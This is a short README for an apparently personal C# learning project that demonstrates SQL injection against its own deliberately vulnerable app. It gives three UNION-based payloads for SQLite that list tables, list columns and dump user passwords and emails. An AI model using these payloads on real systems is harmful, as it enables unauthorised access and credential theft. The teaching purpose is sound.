# Why
Because I wanted to learn C# and be aware of the common vulnerabilities.

# This
This project is an example of how vulnerable an app can be to SQL injection. Even tho there are a lot of ways to prevent it, keep in mind that Code injection is a thing that is still "common".

Here are the commands you can run to exploit the vulnerable code. There are some other ways to SQLI :)

## List the tables
`1 UNION SELECT name, NULL FROM sqlite_master WHERE type='table'--`

## List the columns
`1 UNION SELECT name, NULL FROM pragma_table_info('users')--`

## Dump the data
`1 UNION SELECT password, email from users--`

# I'm not a C# expert nor a software engineer.
Feel free ton contact me if you have any tips on my "patched" code :)